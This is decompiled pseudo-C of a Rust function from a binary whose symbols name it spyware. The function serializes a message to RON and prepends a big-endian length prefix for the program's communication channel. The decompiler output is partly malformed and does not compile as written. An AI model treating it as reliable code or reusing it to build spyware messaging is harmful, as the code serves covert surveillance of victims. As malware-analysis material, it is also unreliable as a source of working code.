long long spyware::communication::serialization::serialize_message(struct_0 *a0, unsigned long long a1)
{
    unsigned int v0;  // [bp-0xac]
    char v1;  // [bp-0xa8], Other Possible Types: unsigned long long
    char v2;  // [bp-0xa0], Other Possible Types: unsigned long long
    void* v3;  // [bp-0x98]
    unsigned long long v4;  // [bp-0x90]
    char v5;  // [bp-0x88]
    char v6;  // [bp-0x78]
    unsigned long long v7;  // [bp-0x68]
    unsigned int v8;  // [bp-0x58]
    char v9;  // [bp-0x48]
    char v10;  // [bp-0x38]
    unsigned long long v12;  // r15
    unsigned long long v13;  // rdx
    unsigned long long v14;  // rax

    ron::ser::to_string(&v1, a1);
    if (*((int *)&v1) != 33)
    {
        memcpy(&v10, &v5, 16);
        memcpy(&v9, &v3, 16);
        memcpy(&v8, &v1, 16);
        spyware::communication::serialization::serialize_message::{{closure}}(&v8); /* do not return */
    }
    v12 = v4;
    v7 = v12;
    memcpy(&v6, &v2, 16);
    v1 = v12 + 4.with_capacity_in();
    v2 = v13;
    v3 = 0;
    v0 = 0;
    v14 = v0.index_mut();
    v8 = __buildin_bswap32(v12);
    core::slice::<impl [T]>::copy_from_slice(v14, 4, &v8, 4, &g_4b9df8);
    v1.write_all(&v0);
    v8.into_iter(&v6);
    v1.spec_extend(&v8, &g_4b9e10);
    a0->field_10 = 0;
    a0->field_0 = *((int128_t *)&v1);
    ::0x4575e0::core::ptr::drop_in_place<spyware::communication::messages::Message>(a1);
    return a0;
}
